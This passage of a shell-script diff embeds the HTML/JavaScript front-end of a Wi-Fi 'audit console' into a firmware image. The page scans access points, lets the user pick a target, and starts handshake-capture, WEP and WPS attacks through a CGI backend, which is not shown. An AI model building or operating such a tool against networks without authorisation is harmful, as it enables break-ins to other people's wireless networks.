+    let rows=t.trim().split('\n').filter(x=>x.split('|').length>=6);
+    if(!rows.length){document.getElementById('aps').innerHTML='没扫到 AP';return;}
+    document.getElementById('aps').innerHTML=rows.map(r=>{
+      let p=r.split('|'), s=p[0], f=p[6]?' <b style="color:#d29922">WPA3</b>':'';
+      let safe=s.replace(/'/g,'').replace(/[<>]/g,'');
+      return '<button class="ap" onclick="pick(\''+p[1]+'\',\''+safe+'\')"><b>'+safe+'</b>'+f+' <span>'+p[4]+' CH'+p[2]+' '+p[3]+'dBm 客户端'+p[5]+'</span><br><span>'+p[1]+'</span></button>';
+    }).join('');
+  });
+}
+function pick(b,s){
+  document.getElementById('tgt').value=b;
+  document.getElementById('wept').value=b;
+  document.getElementById('wpst').value=b;
+  document.getElementById('st1').textContent='目标：'+s+' ('+b+')';
+}
+function startV(v){
+  let t=document.getElementById('tgt').value.trim();
+  if(v=='wep')t=document.getElementById('wept').value.trim();
+  if(v=='wps')t=document.getElementById('wpst').value.trim();
+  if(!t){alert('先填目标或从扫描里点一个');return;}
+  let n=(v=='wep'?document.getElementById('weps').value:document.getElementById('sec').value)||180;
+  let m=(v=='wps'?wmode:mode);
+  const which=v=='wep'?'o2':(v=='wps'?'o3':'o1');
+  q('a=start&v='+v+'&t='+encodeURIComponent(t)+'&s='+n+'&m='+m,which);
+}
+function stop(){q('a=stop','o1');['st1','st2','st3'].forEach(i=>document.getElementById(i).textContent='状态：已停');}
+function poll(){
+  if(tab==1||tab==2||tab==3){
+    let v=tab==2?'wep':(tab==3?'wps':'hs'), oid=tab==2?'o2':(tab==3?'o3':'o1'), sid='st'+(tab==1?'1':tab);
+    fetch('/cgi-bin/a3v6?a=poll&v='+v).then(r=>r.text()).then(t=>{
+      const o=document.getElementById(oid);o.textContent=t;o.scrollTop=99999;
+      document.getElementById(sid).textContent='状态：'+(t.indexOf('STATE=yes')>=0?'运行中':'空闲');});
+  }
+}
+setInterval(poll,2000);
+</script></body></html>
+PAGE6_EOF
+chmod 644 "$SRC/files/www/a3v6.html"
+echo "==> [v35] 审计台 6.0（w3v6/cap6/a3v6/a3v6.html）已烘入镜像"
